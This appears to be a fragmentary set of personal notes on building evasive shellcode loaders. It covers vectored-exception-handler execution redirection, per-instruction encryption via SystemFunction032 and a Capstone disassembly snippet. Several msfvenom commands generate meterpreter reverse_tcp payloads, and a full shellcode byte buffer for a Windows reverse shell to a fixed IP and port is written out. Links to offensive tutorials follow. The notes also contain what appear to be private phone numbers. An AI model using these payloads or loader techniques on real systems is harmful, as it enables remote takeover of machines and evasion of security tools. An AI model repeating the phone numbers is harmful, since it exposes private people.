

				VEH

exceptionData->ContextRecord->Rip ( Might be 400 )

400 >= 00  && 400 <=  00+98 || 400 == ( new thread entrypoint will be inside a IMG memory space (.text segment) )


When thread came to .text segment, Switch Over Control to Newly allocated memory ( that s allocation_base )



Now, 
 

we at now  newly alloacated space -00

---------



typedef struct CRYPT_BYTES_QUOTA {

	DWORD RVA;		// offset to encrypted instruction 
	DWORD quota;	// number of opcodes that generate the instruction

} CRYPT_BYTES_QUOTA, * PCRYPT_BYTES_QUOTA;



	instruction[0].RVA = 0;
	instruction[0].quota = 1;
	instruction[1].RVA = 1;
	instruction[1].quota = 4;



SystemFunction032

https://www.redteam.cafe/red-team/shellcode-injection/inmemory-shellcode-encryption-and-decryption-using-systemfunction033

https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/


...

Nanavaras.. 9994644836

           dad-- 094426195353
		07010822769

......................................

	RVA = RIP - BaseAddress_of_MemoryPage

	thread's RIP register, which holds the address of the next instruction to be executed by the thread.
	Identify the base address of the memory page where the instruction pointed to by the RIP resides



	uint8_t instructionBytes[] = {0x8B, 0x45, 0x08, 0x83, 0xE8, 0x03};




	#include <stdio.h>
#include <stdint.h>
#include <capstone/capstone.h>  // Include the Capstone header

// Define a sample base address and RVA
#define BASE_ADDRESS 0x400000
#define SAMPLE_RVA 0x100

int main() {
    // Initialize Capstone engine
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        printf("Failed to initialize Capstone\n");
        return -1;
    }

    // Simulated base address and module data
    uint8_t moduleData[] = {
        // ... Raw data representing the module's content
    };

    // Calculate the memory address by adding RVA to the base address
    uintptr_t memoryAddress = (uintptr_t)moduleData + SAMPLE_RVA;

    // Disassemble the instruction at the memory address
    count = cs_disasm(handle, (const uint8_t *)memoryAddress, 16, memoryAddress, 0, &insn);

    if (count > 0) {
        // Print the resolved RVA and memory address
        printf("Resolved RVA: 0x%X\n", SAMPLE_RVA);
        printf("Memory Address: 0x%lX\n", memoryAddress);

        // Print the disassembled instruction
        printf("Disassembled Instruction: %s %s\n", insn[0].mnemonic, insn[0].op_str);

        cs_free(insn, count);
    } else {
        printf("Disassembly failed\n");
    }

    // Close Capstone engine
    cs_close(&handle);

    return 0;
}


...



https://www.kalilinux.in/2019/08/install-python3-in-kali-linux.html
https://hacksland.net/reverse-tcp-shell-with-metasploit


msfvenom -p linux/x86/meterpreter/reverse_tcp -o shell.elf LHOST=192.168.56.1 LPORT=555


msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread -e generic/none -f python


msfvenom -p windows/meterpreter/reverse_tcp -o shell.exe LHOST=192.168.56.1 LPORT=555


msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.79.133  LPORT=5555 -e generic/none -f python

buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b"
buf += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a"
buf += b"\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10"
buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
buf += b"\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18\x85\xc9\x74"
buf += b"\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf"
buf += b"\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x4f\x85\x68\x02"
buf += b"\x00\x15\xb3\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += b"\x53\xff\xd5"




msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.56.1 LPORT=555 -e generic/none -f python



meterpreter/reverse_tcp

...........


https://twitter.com/dazzyddos
https://g3tsyst3m.github.io/encoding/How-to-use-Bitwise-Arithmetic-Shift-Right-Encoding-with-your-Shellcode/
https://blog.neuvik.com/journey-into-windows-kernel-exploitation-the-basics-fff72116ca33

